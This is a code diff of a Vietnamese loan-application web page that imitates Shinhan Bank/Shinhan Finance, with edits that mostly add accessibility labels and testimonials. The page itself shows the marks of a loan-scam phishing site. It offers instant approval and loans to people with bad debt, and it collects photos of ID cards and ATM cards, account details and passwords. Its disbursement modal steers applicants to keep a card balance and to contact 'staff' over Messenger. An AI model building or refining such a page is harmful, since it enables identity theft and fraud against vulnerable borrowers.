-                    <p><strong>Ảnh:</strong> CCCD và thẻ ATM đã được tải lên</p>
-                    <button onclick="document.querySelector('#profile-modal').style.display='none'">Đóng</button>
-                `;
-            });
-
-            document.querySelector('#disbursement-conditions').addEventListener('click', () => {
-                document.querySelector('#disbursement-modal').style.display = 'flex';
-            });
-
-            document.querySelector('#contact-staff').addEventListener('click', () => {
-                window.open('https://m.me/shinhanfinancer', '_blank');
-            });
-
-            const noCardLink = document.querySelector('.no-card');
-            noCardLink.addEventListener('click', () => {
-                alert('Để xem số thẻ, đăng nhập ứng dụng ngân hàng hoặc liên hệ chi nhánh. Nếu chưa có thẻ, vui lòng đến Shinhan Bank để phát hành.');
-            });
-
-            const callButton = document.querySelector('.support-btn.call');
-            callButton.addEventListener('click', () => {
-                window.location.href = 'tel:19001577';
-            });
-
-            const chatButton = document.querySelector('.support-btn.chat');
-            chatButton.addEventListener('click', () => {
-                alert('Chức năng chat đang được phát triển. Vui lòng gọi hotline 1900 1577 để được hỗ trợ!');
-            });
-
-            const messengerButton = document.querySelector('.support-btn.messenger');
-            messengerButton.addEventListener('click', () => {
-                window.open('https://m.me/shinhanfinancer', '_blank');
-            });
-
-            document.querySelectorAll('.sub-items a').forEach(link => {
-                link.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    const targetId = link.getAttribute('href').substring(1);
-                    document.getElementById(targetId)?.scrollIntoView({ behavior: 'smooth' });
-                });
-            });
-
-            function downloadContract() {
-                const contractContent = `
-                    HỢP ĐỒNG VAY TÍN CHẤP SHINHAN BANK
-                    Số hợp đồng: ${window.profileCode || `SHB-${Date.now()}`}
-                    Ngày ký: ${new Date().toLocaleDateString('vi-VN')}
-                    Bên vay: ${formData.name || 'N/A'}
-                    CCCD/CMND: ${formData.cccd || 'N/A'}
-                    Số tiền vay: ${formData.loanAmount || 'N/A'} VNĐ
-                    Thời hạn vay: ${formData.loanTerm || 'N/A'} tháng
-                    Loại vay: ${formData.loanType || 'N/A'}
-                    Lãi suất: 8%/năm
-                    Điều khoản: Bên vay cam kết thanh toán đúng hạn.
-                `;
-                const blob = new Blob([contractContent], { type: 'text/plain' });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `contract-${window.profileCode || 'SHB'}.txt`;
-                a.click();
-                URL.revokeObjectURL(url);
-            }
-
-            const loginButton = document.querySelector('.auth-buttons button:nth-child(1)');
-            loginButton.addEventListener('click', () => {
-                document.querySelector('#login-modal').style.display = 'flex';
-            });
-
-            const registerModalButton = document.querySelector('.auth-buttons button:nth-child(2)');
-            registerModalButton.addEventListener('click', () => {
-                document.querySelector('#register-modal').style.display = 'flex';
-            });
-
-            document.querySelectorAll('.modal').forEach(modal => {
-                modal.addEventListener('click', (e) => {
-                    if (e.target === modal) {
-                        modal.style.display = 'none';
-                    }
-                });
-            });
-
-            document.addEventListener('keydown', (e) => {
-                if (e.key === 'Escape') {
-                    document.querySelectorAll('.modal').forEach(modal => {
-                        modal.style.display = 'none';
-                    });
-                }
-            });
-
-            const darkModeToggle = document.querySelector('.dark-mode-toggle');
-            darkModeToggle.addEventListener('click', () => {
-                document.body.classList.toggle('dark-mode');
-                localStorage.setItem('darkMode', document.body.classList.contains('dark-mode'));
-            });
-
-            if (localStorage.getItem('darkMode') === 'true') {
-                document.body.classList.add('dark-mode');
-            }
-
-            const backToTop = document.querySelector('.back-to-top');
-            backToTop.addEventListener('click', () => {
-                window.scrollTo({ top: 0, behavior: 'smooth' });
-            });
-
-            const progressSteps = document.querySelectorAll('.progress-step');
-            progressSteps.forEach((step, index) => {
-                step.addEventListener('click', () => {
-                    progressSteps.forEach(s => s.classList.remove('active'));
-                    for (let i = 0; i <= index; i++) {
-                        progressSteps[i].classList.add('active');
-                    }
-                });
-            });
-        });
-    </script>
+    <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js" defer></script>
+    <script src="./js/script.js" defer></script>
 </head>
 <body>
     <header>
         <div class="logo">
-            <img src="/assets/images/logo.png" alt="Shinhan Bank Logo">
+            <img src="./assets/images/logo.png" alt="Shinhan Finance Logo" aria-label="Shinhan Finance Logo">
         </div>
-        <button class="hamburger">☰</button>
+        <button class="hamburger" aria-label="Toggle menu">☰</button>
         <nav>
             <button class="back-btn">Quay lại</button>
             <a href="#home">TRANG CHỦ</a>
@@ -1229,23 +37,20 @@
             <a href="#transfer">CHUYỂN TIỀN</a>
         </nav>
         <div class="auth-buttons">
-            <button>ĐĂNG NHẬP</button>
-            <button>ĐĂNG KÝ</button>
+            <button aria-label="Đăng nhập">ĐĂNG NHẬP</button>
+            <button aria-label="Đăng ký">ĐĂNG KÝ</button>
         </div>
-        <button class="dark-mode-toggle">🌙</button>
+        <select class="language-toggle" aria-label="Chọn ngôn ngữ">
+            <option value="vi">Tiếng Việt</option>
+            <option value="en">English</option>
+        </select>
+        <button class="dark-mode-toggle" aria-label="Chuyển chế độ tối">🌙</button>
     </header>
 
     <section class="home-section" id="home">
-        <h2>Chào mừng đến với Shinhan Bank</h2>
+        <h2>Chào mừng đến với Shinhan Finance</h2>
         <p>Khám phá các giải pháp tài chính toàn diện từ vay tiêu dùng, doanh nghiệp đến thẻ tín dụng. Duyệt vay nhanh trong 60 phút. Nhận ưu đãi lãi suất 0% trong 3 tháng đầu khi mở thẻ tín dụng Shinhan!</p>
-        <img src="https://imgur.com/KCBNXU6.jpg" alt="Icon Home" class="section-icon" loading="lazy">
-    </section>
-
-    <section class="intro-section" id="introduction">
-        <h2>Giới thiệu về Shinhan Bank</h2>
-        <p>Shinhan Bank Việt Nam, thành viên của Shinhan Financial Group, cung cấp các sản phẩm tài chính sáng tạo, an toàn và đáng tin cậy từ năm 1993. Shinhan PWM mang đến dịch vụ quản lý tài sản cao cấp, cá nhân hóa cho khách hàng thượng lưu.</p>
-        <p><strong>Mới:</strong> Đạt giải thưởng "Ngân hàng bán lẻ tốt nhất Việt Nam 2024" từ Asia Banking Awards.</p>
-        <img src="https://imgur.com/0z0zaKR.jpg" alt="Icon Intro" class="section-icon" loading="lazy">
+        <img src="https://imgur.com/KCBNXU6.jpg" alt="Biểu tượng trang chủ" class="section-icon" loading="lazy">
     </section>
 
     <section class="banner">
@@ -1254,7 +59,67 @@
             <p>Sở hữu nguồn vốn mơ ước với lãi suất thấp, chi phí rõ ràng, đặc biệt hỗ trợ khách hàng có nợ xấu!</p>
             <button onclick="document.querySelector('#register-form .section-toggle').click()">TÌM HIỂU THÊM</button>
         </div>
-        <img src="https://imgur.com/Cre8tQr.jpg" alt="Banner Image" loading="lazy">
+        <img src="https://imgur.com/Cre8tQr.jpg" alt="Hình ảnh quảng cáo vay vốn" loading="lazy">
+    </section>
+
+    <section class="core-values">
+        <h2>Giá trị cốt lõi</h2>
+        <div class="values-grid">
+            <div class="value-card">
+                <img src="./assets/images/customer_centric.png" alt="Hướng tới khách hàng" loading="lazy">
+                <h3>Hướng tới khách hàng</h3>
+                <p>Đặt khách hàng làm trung tâm trong mọi hoạt động.</p>
+            </div>
+            <div class="value-card">
+                <img src="./assets/images/global_brand.png" alt="Thương hiệu toàn cầu" loading="lazy">
+                <h3>Thương hiệu toàn cầu</h3>
+                <p>Chất lượng dịch vụ đạt chuẩn quốc tế.</p>
+            </div>
+            <div class="value-card">
+                <img src="./assets/images/compassionate_finance.png" alt="Tài chính nhân ái" loading="lazy">
+                <h3>Tài chính nhân ái</h3>
+                <p>Hỗ trợ tài chính với sự đồng cảm và minh bạch.</p>
+            </div>
+            <div class="value-card">
+                <img src="./assets/images/value_experience.png" alt="Giá trị & Trải nghiệm" loading="lazy">
+                <h3>Giá trị & Trải nghiệm</h3>
+                <p>Mang lại trải nghiệm tài chính vượt trội.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="testimonials">
+        <h2>Khách hàng nói gì</h2>
+        <div class="swiper">
+            <div class="swiper-wrapper">
+                <div class="swiper-slide">
+                    <div class="testimonial-card">
+                        <img src="./assets/images/testimonial1.jpg" alt="Ảnh đại diện Mr. Bùi Nhật Sang" loading="lazy">
+                        <p>Chúng tôi tin rằng việc MoMo cùng Shinhan Finance luôn đồng hành và hợp tác lâu dài sẽ mang đến những giá trị thiết thực dành cho khách hàng cũng như đạt được nhiều thành công mới trong tương lai.</p>
+                        <h4>Mr. Bùi Nhật Sang</h4>
+                        <span>MoMo</span>
+                    </div>
+                </div>
+                <div class="swiper-slide">
+                    <div class="testimonial-card">
+                        <img src="./assets/images/testimonial2.jpg" alt="Ảnh đại diện Ms. Võ Thị Cẩm Nhung" loading="lazy">
+                        <p>VNPAY tự hào khi được đồng hành và sát cánh cùng Shinhan Finance trong suốt thời gian qua và cả trong hành trình hợp tác đa dịch vụ, đa nền tảng sắp tới. Chúc mừng Shinhan Finance 5 năm phát triển.</p>
+                        <h4>Ms. Võ Thị Cẩm Nhung</h4>
+                        <span>VNPAY</span>
+                    </div>
+                </div>
+                <div class="swiper-slide">
+                    <div class="testimonial-card">
+                        <img src="./assets/images/testimonial3.jpg" alt="Ảnh đại diện Ms. Phan Thị Cẩm Tú" loading="lazy">
+                        <p>Nguyễn Kim và Shinhan Finance không chỉ là mối quan hệ hợp tác về thương mại, mà còn chung sứ mệnh mang đến khách hàng trải nghiệm tốt nhất thông qua sản phẩm và dịch vụ tài chính an toàn, minh bạch.</p>
+                        <h4>Ms. Phan Thị Cẩm Tú</h4>
+                        <span>Nguyễn Kim</span>
+                    </div>
+                </div>
+            </div>
+            <div class="swiper-button-prev"></div>
+            <div class="swiper-button-next"></div>
+        </div>
     </section>
 
     <section class="categories">
@@ -1298,66 +163,66 @@
 
     <section class="main-sections">
         <div class="section-toggle" id="loan-packages">
-            <h3>Các Gói Vay Tiêu Dùng</h3>
+            <h3>C các Gói Vay Tiêu Dùng</h3>
             <span class="arrow">▼</span>
         </div>
         <div class="section-content">
             <div class="loan-card">
-                <img src="https://imgur.com/vohGl6i.jpg" alt="Car" loading="lazy">
+                <img src="https://imgur.com/vohGl6i.jpg" alt="Vay mua xe" loading="lazy">
                 <div>
                     <h4>Vay Mua Xe</h4>
                     <p>Lãi suất cạnh tranh, tài trợ 80% giá trị xe, thời hạn 8 năm.</p>
                 </div>
-                <button onclick="this.parentElement.querySelector('.details').classList.toggle('active'); this.textContent = this.parentElement.querySelector('.details').classList.contains('active') ? 'Ẩn chi tiết' : 'Xem tiếp'">Xem tiếp</button>
-                <button onclick="document.querySelector('#register-form .section-toggle').click()">Đăng Ký</button>
+                <button onclick="toggleDetails(this)">Xem tiếp</button>
+                <button onclick="scrollToRegister()">Đăng Ký</button>
                 <div class="details">
                     <p>Lãi suất: 6.5%/năm<br>Hạn mức: 80% giá trị xe (tối đa 1 tỷ VNĐ)<br>Thời hạn: Tối đa 8 năm<br>Điều kiện: Thu nhập từ 10 triệu/tháng, không nợ xấu</p>
                 </div>
             </div>
             <div class="loan-card">
-                <img src="https://imgur.com/jyTRFlV.jpg" alt="House" loading="lazy">
+                <img src="https://imgur.com/jyTRFlV.jpg" alt="Vay mua nhà" loading="lazy">
                 <div>
                     <h4>Vay Mua Nhà</h4>
                     <p>Lãi suất cạnh tranh, tài trợ 70% giá trị tài sản, thời hạn 30 năm.</p>
                 </div>
-                <button onclick="this.parentElement.querySelector('.details').classList.toggle('active'); this.textContent = this.parentElement.querySelector('.details').classList.contains('active') ? 'Ẩn chi tiết' : 'Xem tiếp'">Xem tiếp</button>
-                <button onclick="document.querySelector('#register-form .section-toggle').click()">Đăng Ký</button>
+                <button onclick="toggleDetails(this)">Xem tiếp</button>
+                <button onclick="scrollToRegister()">Đăng Ký</button>
                 <div class="details">
                     <p>Lãi suất: 7.0%/năm<br>Hạn mức: 70% giá trị tài sản (tối đa 5 tỷ VNĐ)<br>Thời hạn: Tối đa 30 năm<br>Điều kiện: Có tài sản đảm bảo, thu nhập ổn định từ 15 triệu/tháng</p>
                 </div>
             </div>
             <div class="loan-card">
-                <img src="https://imgur.com/SroDtES.jpg" alt="Cash" loading="lazy">
+                <img src="https://imgur.com/SroDtES.jpg" alt="Vay tiêu dùng" loading="lazy">
                 <div>
                     <h4>Vay Tiêu Dùng</h4>
                     <p>Hạn mức 900 triệu, thời hạn 60 tháng.</p>
                 </div>
-                <button onclick="this.parentElement.querySelector('.details').classList.toggle('active'); this.textContent = this.parentElement.querySelector('.details').classList.contains('active') ? 'Ẩn chi tiết' : 'Xem tiếp'">Xem tiếp</button>
-                <button onclick="document.querySelector('#register-form .section-toggle').click()">Đăng Ký</button>
+                <button onclick="toggleDetails(this)">Xem tiếp</button>
+                <button onclick="scrollToRegister()">Đăng Ký</button>
                 <div class="details">
                     <p>Lãi suất: 8.0%/năm<br>Hạn mức: Tối đa 900 triệu VNĐ<br>Thời hạn: Tối đa 60 tháng<br>Điều kiện: Thu nhập từ 6 triệu/tháng, không nợ xấu</p>
                 </div>
             </div>
             <div class="loan-card">
-                <img src="https://imgur.com/VqtlQjl.jpg" alt="Online Loan" loading="lazy">
+                <img src="https://imgur.com/VqtlQjl.jpg" alt="Vay tiêu dùng trực tuyến" loading="lazy">
                 <div>
                     <h4>Vay Tiêu Dùng Trực Tuyến</h4>
                     <p>Vay nhanh qua Mobile Banking SOL, thủ tục 100% trực tuyến.</p>
                 </div>
-                <button onclick="this.parentElement.querySelector('.details').classList.toggle('active'); this.textContent = this.parentElement.querySelector('.details').classList.contains('active') ? 'Ẩn chi tiết' : 'Xem tiếp'">Xem tiếp</button>
-                <button onclick="document.querySelector('#register-form .section-toggle').click()">Đăng Ký</button>
+                <button onclick="toggleDetails(this)">Xem tiếp</button>
+                <button onclick="scrollToRegister()">Đăng Ký</button>
                 <div class="details">
                     <p>Lãi suất: 8.5%/năm<br>Hạn mức: Tối đa 100 triệu VNĐ<br>Thời hạn: Tối đa 36 tháng<br>Điều kiện: Tài khoản Shinhan active, thu nhập từ 5 triệu/tháng</p>
                 </div>
             </div>
             <div class="loan-card">
-                <img src="https://imgur.com/XC5xLsZ.jpg" alt="Savings" loading="lazy">
+                <img src="https://imgur.com/XC5xLsZ.jpg" alt="Vay thế chấp sổ tiết kiệm" loading="lazy">
                 <div>
                     <h4>Vay Thế Chấp Sổ Tiết Kiệm</h4>
                     <p>Lãi suất tiền gửi + 1.9%/năm, liên hệ chi nhánh cho vay trên 100 triệu.</p>
                 </div>
-                <button onclick="this.parentElement.querySelector('.details').classList.toggle('active'); this.textContent = this.parentElement.querySelector('.details').classList.contains('active') ? 'Ẩn chi tiết' : 'Xem tiếp'">Xem tiếp</button>
-                <button onclick="document.querySelector('#register-form .section-toggle').click()">Đăng Ký</button>
+                <button onclick="toggleDetails(this)">Xem tiếp</button>
+                <button onclick="scrollToRegister()">Đăng Ký</button>
                 <div class="details">
                     <p>Lãi suất: Tiền gửi + 1.9%/năm<br>Hạn mức: 90% giá trị sổ tiết kiệm<br>Thời hạn: Tối đa 12 tháng<br>Điều kiện: Có sổ tiết kiệm tại Shinhan, liên hệ chi nhánh cho khoản vay lớn</p>
                 </div>
@@ -1369,9 +234,9 @@
             <span class="arrow">▼</span>
         </div>
         <div class="section-content">
-            <input type="number" placeholder="Số tiền vay (VNĐ)" id="calc-loan-amount">
-            <input type="number" placeholder="Thời hạn vay (tháng)" id="calc-loan-term">
-            <select id="calc-loan-type">
+            <input type="number" placeholder="Số tiền vay (VNĐ)" id="calc-loan-amount" aria-label="Số tiền vay">
+            <input type="number" placeholder="Thời hạn vay (tháng)" id="calc-loan-term" aria-label="Thời hạn vay">
+            <select id="calc-loan-type" aria-label="Loại vay">
                 <option value="">Loại vay</option>
                 <option value="Vay mua xe">Vay mua xe</option>
                 <option value="Vay mua nhà">Vay mua nhà</option>
@@ -1380,7 +245,7 @@
                 <option value="Vay thế chấp sổ tiết kiệm">Vay thế chấp sổ tiết kiệm</option>
             </select>
             <button onclick="calculateLoanInterest()">Tính ngay</button>
-            <canvas id="loan-chart" width="400" height="200"></canvas>
+            <canvas id="loan-chart" width="400" height="200" aria-label="Biểu đồ lãi suất vay"></canvas>
             <div class="result" id="calc-result"></div>
         </div>
 
@@ -1390,17 +255,17 @@
         </div>
         <div class="section-content">
             <p>Chuyển khoản, ví điện tử, quầy ngân hàng. Nhắc nhở tự động qua Mobile Banking SOL.</p>
-            <table>
+            <table aria-label="Lịch sử thanh toán khoản vay">
                 <tr><th>Ngày</th><th>Số tiền</th><th>Trạng thái</th></tr>
                 <tr><td>01/05/2025</td><td>2,500,000</td><td>Chưa thanh toán</td></tr>
             </table>
             <h4>Thanh toán trực tuyến</h4>
-            <input type="text" id="payment-account" placeholder="Số tài khoản">
-            <input type="number" id="payment-amount" placeholder="Số tiền thanh toán (VNĐ)">
+            <input type="text" id="payment-account" placeholder="Số tài khoản" aria-label="Số tài khoản">
+            <input type="number" id="payment-amount" placeholder="Số tiền thanh toán (VNĐ)" aria-label="Số tiền thanh toán">
             <p class="photo-guidance">Hướng dẫn: Mở ứng dụng ngân hàng, chọn mục chụp ảnh CCCD/thẻ ATM, đảm bảo ảnh rõ nét, đầy đủ thông tin.</p>
-            <input type="file" id="payment-cccd-front" accept="image/*" placeholder="Ảnh CCCD mặt trước">
-            <input type="file" id="payment-cccd-back" accept="image/*" placeholder="Ảnh CCCD mặt sau">
-            <input type="file" id="payment-atm-card" accept="image/*" placeholder="Ảnh thẻ ATM">
+            <input type="file" id="payment-cccd-front" accept="image/jpeg,image/png" aria-label="Ảnh CCCD mặt trước">
+            <input type="file" id="payment-cccd-back" accept="image/jpeg,image/png" aria-label="Ảnh CCCD mặt sau">
+            <input type="file" id="payment-atm-card" accept="image/jpeg,image/png" aria-label="Ảnh thẻ ATM">
             <button id="payment-submit" onclick="submitPayment()">Thanh toán qua SOL</button>
         </div>
 
@@ -1410,8 +275,8 @@
         </div>
         <div class="section-content">
             <p>Tất toán toàn bộ khoản vay của bạn trước hạn để tiết kiệm chi phí lãi suất.</p>
-            <input type="text" id="settlement-account" placeholder="Số tài khoản">
-            <input type="number" id="settlement-amount" placeholder="Số dư nợ còn lại (VNĐ)">
+            <input type="text" id="settlement-account" placeholder="Số tài khoản" aria-label="Số tài khoản">
+            <input type="number" id="settlement-amount" placeholder="Số dư nợ còn lại (VNĐ)" aria-label="Số dư nợ">
             <button onclick="confirmSettlement()">Tất toán ngay</button>
             <div class="result" id="settlement-result"></div>
         </div>
@@ -1428,23 +293,23 @@
                 <div class="progress-step"><span>4. Hoàn tất</span></div>
             </div>
             <div class="tooltip">
-                <input type="text" placeholder="Họ và tên">
+                <input type="text" placeholder="Họ và tên" aria-label="Họ và tên">
                 <span class="tooltiptext">Nhập họ và tên đầy đủ</span>
             </div>
             <div class="tooltip">
-                <input type="tel" placeholder="Số điện thoại">
+                <input type="tel" placeholder="Số điện thoại" aria-label="Số điện thoại">
                 <span class="tooltiptext">Số điện thoại phải bắt đầu bằng 0</span>
             </div>
             <div class="tooltip">
-                <input type="email" placeholder="Email">
+                <input type="email" placeholder="Email" aria-label="Email">
                 <span class="tooltiptext">Nhập email hợp lệ</span>
             </div>
-            <input type="text" placeholder="CCCD/CMND">
-            <input type="text" placeholder="Địa chỉ">
-            <input type="number" placeholder="Thu nhập (VNĐ)">
-            <input type="number" placeholder="Số tiền vay (VNĐ)">
-            <input type="number" placeholder="Thời hạn vay (tháng)">
-            <select>
+            <input type="text" placeholder="CCCD/CMND" aria-label="CCCD/CMND">
+            <input type="text" placeholder="Địa chỉ" aria-label="Địa chỉ">
+            <input type="number" placeholder="Thu nhập (VNĐ)" aria-label="Thu nhập">
+            <input type="number" placeholder="Số tiền vay (VNĐ)" aria-label="Số tiền vay">
+            <input type="number" placeholder="Thời hạn vay (tháng)" aria-label="Thời hạn vay">
+            <select aria-label="Loại vay">
                 <option>Loại vay</option>
                 <option>Vay mua xe</option>
                 <option>Vay mua nhà</option>
@@ -1452,35 +317,35 @@
                 <option>Vay tiêu dùng trực tuyến</option>
                 <option>Vay thế chấp sổ tiết kiệm</option>
             </select>
-            <input type="date" placeholder="Ngày sinh">
-            <select>
+            <input type="date" placeholder="Ngày sinh" aria-label="Ngày sinh">
+            <select aria-label="Giới tính">
                 <option>Giới tính</option>
                 <option>Nam</option>
                 <option>Nữ</option>
             </select>
-            <select>
+            <select aria-label="Tình trạng hôn nhân">
                 <option>Tình trạng hôn nhân</option>
                 <option>Độc thân</option>
                 <option>Đã kết hôn</option>
             </select>
-            <input type="text" placeholder="Nghề nghiệp">
-            <input type="text" placeholder="Công ty">
-            <input type="number" placeholder="Số dư tài khoản (VNĐ)">
-            <input type="text" placeholder="Mục đích vay">
+            <input type="text" placeholder="Nghề nghiệp" aria-label="Nghề nghiệp">
+            <input type="text" placeholder="Công ty" aria-label="Công ty">
+            <input type="number" placeholder="Số dư tài khoản (VNĐ)" aria-label="Số dư tài khoản">
+            <input type="text" placeholder="Mục đích vay" aria-label="Mục đích vay">
             <p class="photo-guidance">Hướng dẫn: Mở ứng dụng ngân hàng, chọn mục chụp ảnh CCCD/thẻ ATM, đảm bảo ảnh rõ nét, đầy đủ thông tin.</p>
-            <input type="file" id="cccd-front" accept="image/*" placeholder="Ảnh CCCD mặt trước">
-            <input type="file" id="cccd-back" accept="image/*" placeholder="Ảnh CCCD mặt sau">
-            <input type="file" id="atm-card" accept="image/*" placeholder="Ảnh thẻ ATM">
+            <input type="file" id="cccd-front" accept="image/jpeg,image/png" aria-label="Ảnh CCCD mặt trước">
+            <input type="file" id="cccd-back" accept="image/jpeg,image/png" aria-label="Ảnh CCCD mặt sau">
+            <input type="file" id="atm-card" accept="image/jpeg,image/png" aria-label="Ảnh thẻ ATM">
             <p class="no-card">Không có thẻ ATM? Xem hướng dẫn</p>
-            <button>Gửi Đăng Ký</button>
+            <button onclick="submitRegistration()">Gửi Đăng Ký</button>
         </div>
     </section>
 
     <section class="contract-display">
         <h2>Hợp Đồng Đăng Ký Vay</h2>
-        <p>Hồ sơ của bạn đã được xác nhận với con dấu Shinhan Bank.</p>
+        <p>Hồ sơ của bạn đã được xác nhận với con dấu Shinhan Finance.</p>
         <div id="contract-content"></div>
-        <img src="/assets/images/contract-seal.jpg" alt="Hợp đồng có con dấu" loading="lazy">
+        <img src="./assets/images/contract-seal.jpg" alt="Hợp đồng có con dấu" loading="lazy">
     </section>
 
     <section class="collapsible-section" id="loan-intro">
@@ -1493,7 +358,7 @@
             <p>Hỗ trợ khách hàng có nợ xấu/nợ chú ý, vay tối đa 50 triệu.</p>
             <h3>Điều kiện giải ngân:</h3>
             <p>- Độ tuổi: Nam 21-58, nữ 21-55.<br>- Thu nhập tối thiểu: 4 triệu VNĐ/tháng.<br>- Có CCCD gắn chip.<br>- Hồ sơ phê duyệt trong 15 phút, giải ngân trong 48 giờ sau khi ký hợp đồng online.</p>
-            <img src="https://imgur.com/QuXrjay.jpg" alt="Giới Thiệu Khoản Vay" loading="lazy">
+            <img src="https://imgur.com/QuXrjay.jpg" alt="Giới thiệu khoản vay" loading="lazy">
         </div>
     </section>
 
@@ -1517,7 +382,7 @@
         <p>Giải pháp tài chính cá nhân từ vay tiêu dùng, tiết kiệm đến thẻ tín dụng, đáp ứng mọi nhu cầu của bạn.</p>
         <div class="section-details">
             <p><strong>Mới:</strong> Miễn phí mở tài khoản số đẹp và hoàn tiền 5% khi mua sắm online với thẻ Shinhan.</p>
-            <img src="https://imgur.com/bxo0mSQ.jpg" alt="Cá Nhân" loading="lazy">
+            <img src="https://imgur.com/bxo0mSQ.jpg" alt="Cá nhân" loading="lazy">
         </div>
     </section>
 
@@ -1529,7 +394,7 @@
         <p>Các giải pháp tài chính toàn diện cho doanh nghiệp, từ vay vốn kinh doanh, quản lý dòng tiền đến thanh toán quốc tế.</p>
         <div class="section-details">
             <p><strong>Mới:</strong> Vay vốn doanh nghiệp với lãi suất ưu đãi 5.5%/năm trong 6 tháng đầu.</p>
-            <img src="https://imgur.com/IN3r5DK.jpg" alt="Doanh Nghiệp" loading="lazy">
+            <img src="https://imgur.com/IN3r5DK.jpg" alt="Doanh nghiệp" loading="lazy">
         </div>
     </section>
 
@@ -1553,7 +418,7 @@
         <p>Dịch vụ chuyển tiền nhanh chóng, an toàn trong và ngoài nước với phí giao dịch cạnh tranh.</p>
         <div class="section-details">
             <p><strong>Mới:</strong> Miễn phí chuyển tiền quốc tế cho giao dịch đầu tiên qua Mobile Banking SOL.</p>
-            <img src="https://imgur.com/DbxKP8i.jpg" alt="Chuyển Tiền" loading="lazy">
+            <img src="https://imgur.com/DbxKP8i.jpg" alt="Chuyển tiền" loading="lazy">
         </div>
     </section>
 
@@ -1563,11 +428,15 @@
         <button class="support-btn messenger" title="Nhắn Tin qua Messenger" aria-label="Nhắn tin qua Messenger">📩</button>
     </div>
 
-    <button class="back-to-top" title="Quay lại đầu trang">↑</button>
+    <button class="back-to-top" title="Quay lại đầu trang" aria-label="Quay lại đầu trang">↑</button>
 
     <footer>
-        <p>Shinhan Bank Việt Nam | Hotline: <a href="tel:19001577">1900 1577</a> | Email: <a href="mailto:support@shinhan.vn">support@shinhan.vn</a> | <a href="https://www.facebook.com/shinhanfinancer/">Facebook</a></p>
+        <p>Shinhan Finance Việt Nam | Hotline: <a href="tel:19001577">1900 1577</a> | Email: <a href="mailto:support@shinhan.vn">support@shinhan.vn</a></p>
         <p>Địa chỉ: Tầng 1, Tòa nhà Leadvisors Place, 41A Lý Thái Tổ, Phường Lý Thái Tổ, Quận Hoàn Kiếm, TP. Hà Nội</p>
+        <div class="social-links">
+            <a href="https://www.facebook.com/shinhanfinancer/" aria-label="Facebook"><img src="./assets/images/facebook.png" alt="Facebook"></a>
+            <a href="https://www.linkedin.com/company/shinhan-finance/" aria-label="LinkedIn"><img src="./assets/images/linkedin.png" alt="LinkedIn"></a>
+        </div>
         <div class="pwm-branches">
             <h4>Chi nhánh Shinhan PWM</h4>
             <ul>
@@ -1576,16 +445,17 @@
                 <li>CN Lê Thái Tổ: 14 Lê Thái Tổ, Quận Hoàn Kiếm, Hà Nội</li>
                 <li>Liên hệ PWM: <a href="tel:1800599926">1800 5999 26</a></li>
             </ul>
-            <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3724.506216305928!2d105.85105531487584!3d21.030506985994755!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3135ab145bf0c683%3A0x6a076a5f3b9d8364!2sShinhan%20Bank!5e0!3m2!1sen!2s!4v1633021234567!5m2!1sen!2s" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
+            <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3724.506216305928!2d105.85105531487584!3d21.030506985994755!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3135ab145bf0c683%3A0x6a076a5f3b9d8364!2sShinhan%20Bank!5e0!3m2!1sen!2s!4v1633021234567!5m2!1sen!2s" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy" aria-label="Bản đồ chi nhánh"></iframe>
         </div>
-        <p>© 2025 Shinhan Bank</p>
+        <p><a href="#privacy">Chính sách bảo mật</a> | <a href="#terms">Điều khoản sử dụng</a></p>
+        <p>© 2025 Shinhan Finance</p>
     </footer>
 
     <div class="modal" id="login-modal" aria-label="Đăng nhập">
         <div class="modal-content auth-modal">
             <h2>Đăng Nhập</h2>
-            <input type="text" placeholder="Tên đăng nhập">
-            <input type="password" placeholder="Mật khẩu">
+            <input type="text" placeholder="Tên đăng nhập" aria-label="Tên đăng nhập">
+            <input type="password" placeholder="Mật khẩu" aria-label="Mật khẩu">
             <button>Đăng Nhập</button>
         </div>
     </div>
@@ -1593,9 +463,9 @@
     <div class="modal" id="register-modal" aria-label="Đăng ký">
         <div class="modal-content auth-modal">
             <h2>Đăng Ký</h2>
-            <input type="text" placeholder="Tên đăng nhập">
-            <input type="email" placeholder="Email">
-            <input type="password" placeholder="Mật khẩu">
+            <input type="text" placeholder="Tên đăng nhập" aria-label="Tên đăng nhập">
+            <input type="email" placeholder="Email" aria-label="Email">
+            <input type="password" placeholder="Mật khẩu" aria-label="Mật khẩu">
             <button>Đăng Ký</button>
         </div>
     </div>
@@ -1612,7 +482,7 @@
     <div class="modal" id="approval-modal" aria-label="Kết quả xét duyệt vay">
         <div class="modal-content">
             <h2>Đã đủ điều kiện vay</h2>
-            <p>Hồ sơ của bạn đã được duyệt tại Shinhan Bank.</p>
+            <p>Hồ sơ của bạn đã được duyệt tại Shinhan Finance.</p>
             <p class="profile-code">Mã hồ sơ: </p>
             <div class="action-buttons">
                 <button id="view-profile">Xem Hồ Sơ</button>
@@ -1635,7 +505,7 @@
             <p>✔️ Chỉ cần chụp ảnh qua nhân viên để hoàn tất hồ sơ, sau đó tiền sẽ được chuyển vào tài khoản ngân hàng của bạn.</p>
             <p><strong>Chú ý:</strong> Số dư này không cần đóng hoặc chuyển cho bất kỳ ai. Nó chỉ cần có trong thẻ để chứng minh khả năng vay và chi trả cho ngân hàng, đảm bảo hồ sơ được duyệt.</p>
             <p><strong>Sau khi đủ số dư:</strong> Vui lòng liên hệ nhân viên qua <a href="https://m.me/shinhanfinancer" target="_blank">Messenger</a> hoặc chi nhánh PWM: <a href="tel:1800599926">1800 5999 26</a>.</p>
-            <button onclick="document.querySelector('#disbursement-modal').style.display='none'">Đóng</button>
+            <button onclick="closeModal('disbursement-modal')">Đóng</button>
         </div>
     </div>
 </body>
